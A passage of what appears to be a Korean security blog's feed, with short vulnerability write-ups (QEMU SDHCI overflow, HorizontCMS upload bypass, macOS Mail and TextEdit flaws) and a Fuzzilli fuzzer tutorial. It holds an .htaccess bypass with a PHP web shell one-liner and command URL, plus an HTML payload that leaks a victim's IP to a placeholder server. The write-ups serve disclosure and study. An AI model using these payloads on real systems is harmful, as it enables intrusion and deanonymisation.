class="hljs-regexp">/script&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>idioth</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3409: QEMU Heap overflow in SDHCI</title>
    <link href="/2021/04/07/fabu1ous/2021-04-07/"/>
    <url>/2021/04/07/fabu1ous/2021-04-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://starlabs.sg/advisories/21-3409/">CVE-2021-3409</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>QEMU 5.2.50</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>QEMU 5.2.50 코드의 SDHCI(Secure Digital Host Controller Interface) 컴포넌트는 Heap buffer overflow 취약점이 있습니다. SDHCI는 비휘발성 메모리 카드 포맷인 SD의 컨트롤러 에뮬레이션입니다.</p><pre><code class="hljs python">begin = s-&gt;data_count;         <span class="hljs-keyword">if</span> ((length + begin) &lt; block_size) &#123;             s-&gt;data_count = length + begin;             length = <span class="hljs-number">0</span>;          &#125; <span class="hljs-keyword">else</span> &#123;             s-&gt;data_count = block_size; // [1]             length -= block_size - begin;         &#125;         dma_memory_write(s-&gt;dma_as, dscr.addr,                          &amp;s-&gt;fifo_buffer[begin],                          s-&gt;data_count - begin); // [2]         dscr.addr += s-&gt;data_count - begin;</code></pre><p>위 코드는 함수 <code>sdhci_do_adma</code>의 일부입니다. 함수 <code>sdhci_do_adma</code>는 SDHCI와 Guest system memory(DMA buffer) 간에 데이터 통신을 담당합니다. 블록 버퍼를 사용한 데이터 통신이 이루어질 때 블록 버퍼에 들어갈 데이터 크기를 계산하는 식은 <code>block_size - s-&gt;data_count</code>입니다. <code>s-&gt;data_count</code>는 현재 블록 버퍼의 오프셋을, <code>block_size</code>는 <code>blksize</code>(0x4 오프셋의 레지스터 값)를 담고 있고 데이터 통신이 이루어지는 도중 <code>blksize</code>의 값을 변경할 수 있어 heap overflow 취약점이 발생합니다.</p><p>해당 취약점을 악용해 Geust system을 대상으로 정보 노출, 데이터 추가 및 수정, DoS 공격이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>heap overflow</tag>
      
      <tag>qemu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 자바스크립트 엔진 Fuzzer - Fuzzilli</title>
    <link href="/2021/04/07/insu/fuzzilli/"/>
    <url>/2021/04/07/insu/fuzzilli/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzilli란"><a href="#Fuzzilli란" class="headerlink" title="Fuzzilli란"></a>Fuzzilli란</h1><p>자바스크립트를 퍼징 하기 위해서는 기존에 있는 방법(랜덤한 데이터를 만드는 법 등)을 사용해서는 효율적인 퍼징을 할 수 없습니다. </p><p>그렇기에 sample을 만들 때 문법에 맞는 sample을 만들어야 합니다. 이를 위해 <a href="https://github.com/googleprojectzero/domato">domato</a>라는 grammar-based 퍼저가 있습니다. domato는 사용자가 룰을 만들어 준 뒤 그 룰에 따라 sample을 만듭니다. 하지만 domato는 다음과 같은 문제가 있습니다.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled.png"></p><p><code>v4</code> 값에 대해 <code>slice</code>함수를 실행할 때 <code>slice</code>가 정의되어 있지 않아 뒤에 있는 코드를 실행할 수 없습니다. </p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%201.png"></p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%202.png"></p><p>이를 해결하기 위해서 try-catch 문을 통해 예외 처리를 해주면 예외가 일어나도 다음 문장을 실행할 수 있습니다. 하지만 JIT compiler로 컴파일이 되면 try-catch문이 없는 코드와는 아예 다른 코드를 생성합니다. 그렇기에 높은 수준의 Semantic correctness를 가진 sample을 만들어야 합니다.</p><p>이를 위해서는 몇 가지 방법이 있는데 Fuzzill는 mutation을 통해 semantically valid한 샘플만 corpus에 추가하는 방법을 사용합니다.</p><p>Fuzzilli에서는 FuzzIL이라는 custom intermediate 언어를 만들어 mutation에 사용합니다.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%203.png"></p><p>만들어진 FuzzIL은 다음 그림과 같이 JS 코드로 생성됩니다.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%204.png"></p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%205.png"></p><p>FuzzIL에는 여러 mutator가 존재하는데 다음과 같습니다.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%206.png"></p><ul><li><p>Input Mutator - Input을 바꿉니다.</p></li><li><p>Operation Mutator - Operation을 바꿉니다.</p></li><li><p>Splice Mutator -  다른 corpus에서 코드를 잘라와 새로 넣어줍니다.</p></li><li><p>Insertion Mutator - 새로운 코드를 만들어 넣어줍니다.</p><p>  등등 여러 mutator가 있습니다.</p></li></ul><p>이러한 mutator와 함께 feedback을 추가해 커버리지를 높이는 방식을 사용합니다.</p><p>Fuzzilli는 다음과 같은 방법으로 퍼징을 진행합니다.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%207.png"></p><h1 id="Fuzzilli-설치-및-실행"><a href="#Fuzzilli-설치-및-실행" class="headerlink" title="Fuzzilli 설치 및 실행"></a>Fuzzilli 설치 및 실행</h1><p>Ubuntu 20.04 LTS에서 진행했습니다.</p><p>먼저 clang과 필요한 것들을 설치해줍니다.</p><pre><code class="hljs jsx">apt-get install clang clang++ libicu-dev</code></pre><p>버전에 맞는 <a href="https://swift.org/download/">swift</a>를 설치합니다.</p><p>swift를 설치 한 뒤 PATH를 등록해줍니다.</p><pre><code class="hljs jsx">wget https:<span class="hljs-comment">//swift.org/builds/swift-5.3.3-release/ubuntu2004/swift-5.3.3-RELEASE/swift-5.3.3-RELEASE-ubuntu20.04.tar.gz</span>mkdir ~/swifttar -xvf swift<span class="hljs-number">-5.3</span><span class="hljs-number">.3</span>-RELEASE-ubuntu20<span class="hljs-number">.04</span>.tar.gz -C ~/swift<span class="hljs-keyword">export</span> PATH=~<span class="hljs-regexp">/swift/</span>swift<span class="hljs-number">-5.3</span><span class="hljs-number">.3</span>-RELEASE-ubuntu20<span class="hljs-number">.04</span>/usr/bin/:$PATH</code></pre><p>git을 이용해 fuzzilli를 받아 빌드해줍니다.</p><pre><code class="hljs jsx">git clone https:<span class="hljs-comment">//github.com/googleprojectzero/fuzzilli.git</span>cd swiftswift build -c release</code></pre><p>실행하기 전에 타깃 바이너리를 컴파일해야 하는데, chromium의 v8을 기준으로 설명하겠습니다.</p><p>다음의 코드를 통해 v8 source를 받고 컴파일합니다.</p><pre><code class="hljs jsx">git clone https:<span class="hljs-comment">//chromium.googlesource.com/chromium/tools/depot_tools.git</span><span class="hljs-keyword">export</span> PATH=<span class="hljs-regexp">/path/</span>to/depot_tools:$PATHmkdir ~/v8cd ~/v8fetch v8cd v8/path/to/fuzzilli/Targets/V8/fuzzbuild.sh</code></pre><p>완료하면 v8/out/fuzzbuild/d8이 생성됩니다.</p><p>fuzzilli와 v8을 모두 빌드했으면 다음의 명령어를 통해 fuzzilli를 실행할 수 있습니다.</p><pre><code class="hljs jsx">swift run FuzzilliCli --profile=v8 ~<span class="hljs-regexp">/Desktop/</span>v8/v8/out/fuzzbuild/d8</code></pre><p>실행할 때 여러 옵션들이 있는데 자세한 옵션은 github를 참고하면 됩니다.</p><h1 id="Fuzzilli-분석"><a href="#Fuzzilli-분석" class="headerlink" title="Fuzzilli 분석"></a>Fuzzilli 분석</h1><p>다음의 코드는 FuzzilIL을 test 하기 위해 만드는 FuzzIL입니다. 이 코드를 통해 FuzzIL이 어떻게 만들어지는지 mutation 결과가 어떻게 되는지 분석을 해보겠습니다.</p><pre><code class="hljs swift"><span class="hljs-keyword">let</span> b = makeBuilder() <span class="hljs-comment">//IL을 담을 ProgramBuilder 생성.</span>    <span class="hljs-keyword">let</span> f = b.definePlainFunction(withSignature: <span class="hljs-type">FunctionSignature</span>(withParameterCount: <span class="hljs-number">2</span>)) &#123; params <span class="hljs-keyword">in</span> <span class="hljs-comment">//인자를 2개 받는 함수 선언</span>        <span class="hljs-keyword">let</span> x = b.loadProperty(<span class="hljs-string">&quot;x&quot;</span>, of: params[<span class="hljs-number">0</span>]) <span class="hljs-comment">// 첫 번째 인자의 x property를 가져옴.</span>        <span class="hljs-keyword">let</span> y = b.loadProperty(<span class="hljs-string">&quot;y&quot;</span>, of: params[<span class="hljs-number">0</span>]) <span class="hljs-comment">// 첫 번째 인자의 y property를 가져옴.</span>        <span class="hljs-keyword">let</span> s = b.binary(x, y, with: .<span class="hljs-type">Add</span>) <span class="hljs-comment">// x와 y의 값을 더 함.(첫 번째 인자의 x,y 값의 합.)</span>        <span class="hljs-keyword">let</span> p = b.binary(s, params[<span class="hljs-number">1</span>], with: .<span class="hljs-type">Mul</span>) <span class="hljs-comment">// s의 값과 두번째 인자를 곱함.</span>        b.doReturn(value: p) <span class="hljs-comment">// p의 값을 리턴.</span>    &#125;    b.forLoop(b.loadInt(<span class="hljs-number">0</span>), .lessThan, b.loadInt(<span class="hljs-number">1000</span>), .<span class="hljs-type">Add</span>, b.loadInt(<span class="hljs-number">1</span>)) &#123; i <span class="hljs-keyword">in</span> <span class="hljs-comment">// 반복문 선언, for(i=0;i&lt;1000;i++)</span>        <span class="hljs-keyword">let</span> x = b.loadInt(<span class="hljs-number">42</span>) <span class="hljs-comment">// x = 42</span>        <span class="hljs-keyword">let</span> y = b.loadInt(<span class="hljs-number">43</span>) <span class="hljs-comment">// y = 43</span>        <span class="hljs-keyword">let</span> arg1 = b.createObject(with: [<span class="hljs-string">&quot;x&quot;</span>: x, <span class="hljs-string">&quot;y&quot;</span>: y]) <span class="hljs-comment">// arg1 = &#123;&quot;x&quot;:42, &quot;y&quot;:43&#125;</span>        <span class="hljs-keyword">let</span> arg2 = i <span class="hljs-comment">//arg2 = i</span>        b.callFunction(f, withArgs: [arg1, arg2]) <span class="hljs-comment">//f(arg1, arg2)</span>    &#125;    <span class="hljs-keyword">return</span> b.finalize() <span class="hljs-comment">// 마무리</span></code></pre><p>위의 코드를 IL로 보면 다음과 같습니다.</p><pre><code class="hljs swift">v0 &lt;- <span class="hljs-type">BeginPlainFunctionDefinition</span> -&gt; v1, v2    v3 &lt;- <span class="hljs-type">LoadProperty</span> v1, &#x27;x&#x27;    v4 &lt;- <span class="hljs-type">LoadProperty</span> v1, &#x27;y&#x27;    v5 &lt;- <span class="hljs-type">BinaryOperation</span> v3, &#x27;+&#x27;, v4    v6 &lt;- <span class="hljs-type">BinaryOperation</span> v5, &#x27;*&#x27;, v2    <span class="hljs-type">Return</span> v6<span class="hljs-type">EndPlainFunctionDefinition</span>v7 &lt;- <span class="hljs-type">LoadInteger</span> &#x27;<span class="hljs-number">0</span>&#x27;v8 &lt;- <span class="hljs-type">LoadInteger</span> &#x27;<span class="hljs-number">1000</span>&#x27;v9 &lt;- <span class="hljs-type">LoadInteger</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-type">BeginFor</span> v7, &#x27;&lt;&#x27;, v8, &#x27;+&#x27;, v9 -&gt; v10    v11 &lt;- <span class="hljs-type">LoadInteger</span> &#x27;<span class="hljs-number">42</span>&#x27;    v12 &lt;- <span class="hljs-type">LoadInteger</span> &#x27;<span class="hljs-number">43</span>&#x27;    v13 &lt;- <span class="hljs-type">CreateObject</span> [&#x27;x&#x27;:v11, &#x27;y&#x27;:v12]    v14 &lt;- <span class="hljs-type">CallFunction</span> v0, [v13, v10]<span class="hljs-type">EndFor</span></code></pre><p>이 IL코드를 javascript 코드로 변환하면 다음과 같이 생성됩니다.</p><pre><code class="hljs swift">function main() &#123; <span class="hljs-comment">//v8 code prefix</span>function v0(v1,v2) &#123;    const v3 = v1.x;    const v4 = v1.y;    const v5 = v3 + v4;    const v6 = v5 * v2;    <span class="hljs-keyword">return</span> v6;&#125;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; v10++) &#123;    const v13 = &#123;x:<span class="hljs-number">42</span>,y:<span class="hljs-number">43</span>&#125;;    const v14 = v0(v13,v10);&#125;gc();                              <span class="hljs-comment">//</span>&#125;                                  <span class="hljs-comment">//</span>%<span class="hljs-type">NeverOptimizeFunction</span>(main);      <span class="hljs-comment">// v8 code suffix</span>main();                            <span class="hljs-comment">//</span></code></pre><h2 id="Mutator"><a href="#Mutator" class="headerlink" title="Mutator"></a>Mutator</h2><h3 id="CodeGenMutator"><a href="#CodeGenMutator" class="headerlink" title="CodeGenMutator"></a>CodeGenMutator</h3><p>기존의 코드에 새로운 코드를 삽입하는 Mutation을 진행합니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>&#123;        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        **v0 = v4;**        **<span class="hljs-keyword">const</span> v6 = [v0,v0,v1,v0];**        <span class="hljs-keyword">const</span> v7 = v5 * v2;        <span class="hljs-keyword">return</span> v7;    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v11 = <span class="hljs-number">0</span>; v11 &lt; <span class="hljs-number">1000</span>; v11++) &#123;        **<span class="hljs-keyword">let</span> v15 = <span class="hljs-built_in">Object</span>();        <span class="hljs-keyword">const</span> v16 = <span class="hljs-built_in">Object</span>;        <span class="hljs-keyword">const</span> v17 = v15--;**        <span class="hljs-keyword">const</span> v18 = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>&#125;;        <span class="hljs-keyword">const</span> v19 = v0(v18,v11);    &#125;gc();&#125;%NeverOptimizeFunction(main);main();</code></pre><h3 id="InputMutator"><a href="#InputMutator" class="headerlink" title="InputMutator"></a>InputMutator</h3><p>random으로 Input에 대해 골라서 다른 input으로 바꿔줍니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>&#123;        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        **<span class="hljs-keyword">const</span> v6 = v5 ^ v2;**        <span class="hljs-keyword">return</span> v6;    &#125;    <span class="hljs-keyword">for</span> (**<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">9007199254740992</span>;** v10 &lt; <span class="hljs-number">1000</span>; v10++) &#123;        <span class="hljs-keyword">const</span> v13 = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">a</span>:<span class="hljs-number">43</span>&#125;;        <span class="hljs-keyword">const</span> v14 = v0(v13,v10);    &#125;    gc();    &#125;%NeverOptimizeFunction(main);main();</code></pre><h3 id="OperationMutator"><a href="#OperationMutator" class="headerlink" title="OperationMutator"></a>OperationMutator</h3><p>Operation을 하나 골라서 mutate 해줍니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>&#123;    <span class="hljs-keyword">const</span> v3 = v1.x;    <span class="hljs-keyword">const</span> v4 = v1.y;    <span class="hljs-keyword">const</span> v5 = v3 + v4;    <span class="hljs-keyword">const</span> v6 = v5 * v2;    <span class="hljs-keyword">return</span> v6;&#125;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; **v10 = v10 &amp;&amp; <span class="hljs-number">1</span>**) &#123;    <span class="hljs-keyword">const</span> v13 = &#123;<span class="hljs-attr">toString</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>&#125;;    <span class="hljs-keyword">const</span> v14 = v0(v13,v10);&#125;gc();&#125;%NeverOptimizeFunction(main);main();</code></pre><h3 id="CombineMutator"><a href="#CombineMutator" class="headerlink" title="CombineMutator"></a>CombineMutator</h3><p>corpus에 있는 요소 중 하나를 골라서 코드를 추가해줍니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>&#123;        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        <span class="hljs-keyword">const</span> v6 = v5 * v2;        <span class="hljs-keyword">return</span> v6;    &#125;    **<span class="hljs-keyword">const</span> v11 = <span class="hljs-built_in">Object</span>();**    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v12 = <span class="hljs-number">0</span>; v12 &lt; <span class="hljs-number">1000</span>; v12++) &#123;        <span class="hljs-keyword">const</span> v15 = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>&#125;;        <span class="hljs-keyword">const</span> v16 = v0(v15,v12);    &#125;    gc();&#125;%NeverOptimizeFunction(main);main();</code></pre><h3 id="JITStressMutator"><a href="#JITStressMutator" class="headerlink" title="JITStressMutator"></a>JITStressMutator</h3><p>존재하는 함수를 호출합니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>&#123;        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        <span class="hljs-keyword">const</span> v6 = v5 * v2;        <span class="hljs-keyword">return</span> v6;    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; v10++) &#123;        <span class="hljs-keyword">const</span> v13 = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>&#125;;        <span class="hljs-keyword">const</span> v14 = v0(v13,v10);    &#125;    **<span class="hljs-keyword">const</span> v15 = <span class="hljs-built_in">Object</span>;    <span class="hljs-keyword">const</span> v17 = v0(<span class="hljs-number">1000</span>,<span class="hljs-built_in">Object</span>);**    gc();&#125;%NeverOptimizeFunction(main);main();</code></pre><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>Fuzzilli에 대해 간단하게 알아보았습니다.<br>위에서 소개한 mutator 외에도 여러 mutator가 존재하고 새로운 mutator를 만들거나 새로운 속성들을 추가해주면서 퍼저를 개선할 수 있습니다.</p><p>또한 기존의 javascript 파일을 FuzzIL로 변환해 corpus를 구성해주는 방법을 통해 발전시킬 수 있습니다.</p><p>Fuzzilli를 잘 분석해서 개선한다면 js engine에 대해 효율적으로 퍼징 할 수 있다고 생각합니다.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>fuzzing</tag>
      
      <tag>system</tag>
      
      <tag>fuzzilli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] HorizontCMS 원격 코드 실행 취약점</title>
    <link href="/2021/04/06/l0ch/2021-04-06/"/>
    <url>/2021/04/06/l0ch/2021-04-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-2-php-filetype-bypass-4580176223eb">[BugHunt] Authenticated RCE found in HorizontCMS — Part 2 (PHP Filetype Bypass)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>HorizontCMS</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오픈소스 컨텐츠 관리 시스템인 HorizontCMS에서 기존 파일 업로드 취약점(CVE-2020–27387) 패치에 대한 우회가 발견되어 세부 정보가 공개되었습니다.</p><p>기존 파일 업로드 취약점은 <code>.php</code>, <code>.php5</code>, <code>.php7</code>, <code>.phtml</code>, <code>.inc</code> 와 같은 확장명이 포함된 파일 업로드를 제한하는 것으로 패치되었지만 설정 파일인 <code>.htaccess</code> 필터링을 하지 않아 PHP file type을 변경한 우회 공격이 가능합니다.</p><p>해당 취약점을 이용해 임의 코드를 실행하는 방법은 다음과 같습니다.</p><ol><li>admin 페이지의 Media → Files에서 <code>test2.htaccess</code> 파일을 업로드합니다. 해당 파일의 내용은 아래와 같습니다.<ul><li><code>AddType application/x-httpd-php .exp</code></li></ul></li><li>파일 rename 기능을 이용해 <code>test2.htaccess</code> 파일의 이름을 <code>.htaccess</code>로 변경합니다.</li><li>아래와 같이 임의 코드를 실행할 수 있게 해주는 내용이 포함된 <code>test2.php</code> 파일을 업로드 한 뒤 파일 이름을 <code>test.exp</code> 로 변경합니다.<ul><li><code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></li></ul></li><li>1, 2에서 업로드한 <code>.htaccess</code> 로 인해 <code>.exp</code> 확장자가 php로 실행됩니다. 따라서 <code>test.exp</code>에 접근해 임의 코드를 실행할 수 있습니다.</li></ol><pre><code class="hljs cpp">http:<span class="hljs-comment">//&lt;HorizontCMS IP&gt;/storage/test.exp?cmd=id</span></code></pre><p>취약점 제보자는 악성 플러그인을 악용한 원격 코드 실행 취약점의 관련 정보 또한 공개하였으며 <a href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe">https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe</a> 에서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>php</tag>
      
      <tag>bypass</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] macOS Mail 제로 클릭 취약점</title>
    <link href="/2021/04/05/idioth/2021-04-05/"/>
    <url>/2021/04/05/idioth/2021-04-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mikko-kenttala.medium.com/zero-click-vulnerability-in-apples-macos-mail-59e0c14b106c">Zero click vulnerability in Apple’s macOS Mail</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>macOS Mojave &lt; 10.14.6</li><li>macOS High Sierra &lt; 10.13.6</li><li>macOS Catalina &lt; 10.15.5</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple Mail에서 Mail의 샌드박스 환경 내부에 파일을 추가하거나 수정할 수 있는 zero click 취약점이 발견되었습니다. 해당 취약점을 통해 해커는 비밀번호 초기화를 통해 계정을 탈취할 수 있는 mail redirect 등을 포함하여 메일 설정을 수정할 수 있습니다.</p><p>메일에는 다른 메일 사용자가 압축한 첨부파일을 자동으로 압축 해제할 수 있는 기능이 존재합니다. 사용자가 첨부파일로 폴더를 추가하면 자동적으로 <code>x-mac-auto-archive=yes</code> header로 zip 압축됩니다. 다른 사용자가 해당 매일을 받으면 압축 첨부 파일은 자동적으로 압축이 해제됩니다.</p><p>해당 취약점을 악용하기 위해선 zip 파일 2개가 필요합니다. 첫번째 zip 파일은 <code>$HOME/Library/Mail</code>의 심볼릭 링크 파일과 <code>1.txt </code>파일을 포함하고 두번째 zip 파일은 <code>$HOME/Library/Mail</code>에 수정하려는 것을 포함합니다. 첫번째 zip 파일은 <code>$TMPDIR/com.apple.mail/bom/</code>에 압축 해제됩니다. <code>filename=1.txt.zip</code> 헤더를 기반으로 <code>1.txt</code> 파일은 메일 디렉터리에 복사됩니다. 그 후 두번째 zip 파일을 통해 메일 애플리케이션의 rule을 overwrite 할 수 있습니다.</p><p>이 취약점을 통해 해커는 <code>$HOME/Library/Mail</code> 디렉터리의 모든 파일에 쓰기 권한을 가질 수 있으며 민감한 데이터 누출, 악의적인 설정이 가능하며 원격 코드 실행도 가능성 또한 존재합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mac</tag>
      
      <tag>idioth</tag>
      
      <tag>zero click</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2019-8761: MacOS txt 파일로 html 실행</title>
    <link href="/2021/04/04/insu/2021-04-04/"/>
    <url>/2021/04/04/insu/2021-04-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.paulosyibelo.com/2021/04/this-man-thought-opening-txt-file-is.html">THIS MAN THOUGHT OPENING A TXT FILE IS FINE, HE THOUGHT WRONG. MACOS CVE-2019-8761</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>macOS</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MacOS에서 TextEdit를 통해 확장자명이 txt임에도 불구하고 RTF-HTML 파일로 실행할 수 있는 취약점이 발견되었습니다.</p><p>만약 txt 파일이 다음과 같이 시작하면, txt 파일임에도 HTML 파싱을 합니다.</p><pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</code></pre><p>다음과 같은 CSS 속성이 로컬 CSS 파일을 로드합니다.</p><pre><code class="hljs python">&lt;style&gt; @import &#123; &quot;url &quot; &#125; &lt;/stymle&gt;</code></pre><p>하지만 작동하는 scheme은 <code>file://</code>입니다. 이를 통해 외부 요청은 할 수 없지만 로컬에 저장된 다른 로컬 파일을  열 수 있습니다.  OSX의 AutoMount 기능을 통해 원격 요청을 할 수 있습니다. <code>ls /net/EXAMPLE.com</code>을 수행하면 OSX가 <code>EXAMPLE.com</code>에 원격 요청을 보냅니다. TextEdit에서 외부 요청을 못하도록 차단하였지만 <code>file://</code> scheme를 통해 <code>MYSERVER.COM</code>에 접근할 수 있습니다. <code>MYSERVER.COM</code>에 접근하는 코드는 다음과 같습니다.</p><pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;style&gt;@import&#123; &quot;file:///net/MYSERVER.COM/a.css&quot;&#125; &lt;/style&gt;I know where you are...&lt;/body&gt;&lt;/html&gt;</code></pre><p>AutoMount는 커널을 사용하여 TCP 연결을 하므로 프록시를 사용하더라도 실제 IP 주소를 알 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>information disclosure</tag>
      
      <tag>insu</tag>
      
      <tag>mac</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 3 - A few tips for IDA User</title>
    <link href="/2021/04/04/idioth/ghidra_part3/"/>
    <url>/2021/04/04/idioth/ghidra_part3/</url>
    
    <content type="html"><![CDATA[<p><strong>다른 파트 보러가기</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts</a></p><p>Re:versing으로 시작하는 ghidra 생활 Part 3 - tips for IDA User (Here!)</p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1)</a></p><p><a href="https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/">Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2)</a></p><hr><p>안녕하세요! 오랜만에 찾아뵙습니다. 갑자기 날씨가 엄청나게 더워졌습니다. 봄 옷을 꺼낼 겨를도 없이 갑자기 여름이 찾아온 것만 같은 느낌입니다.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled.png"></p><p>일교차는 또 엄청 커서 밤을 생각하고 옷을 입으면 낮에는 불타는 삶을 살고 있습니다. 특히 BMW가 너무 덥습니다. Bus와 Metro는 사람들의 열기로 후끈후끈하고… 이 날씨에 Walk를 하면 마스크에도 땀이 차는…</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%201.png"></p><p>날씨도 덥고 피곤하니 시원한 아메리카노 한 잔 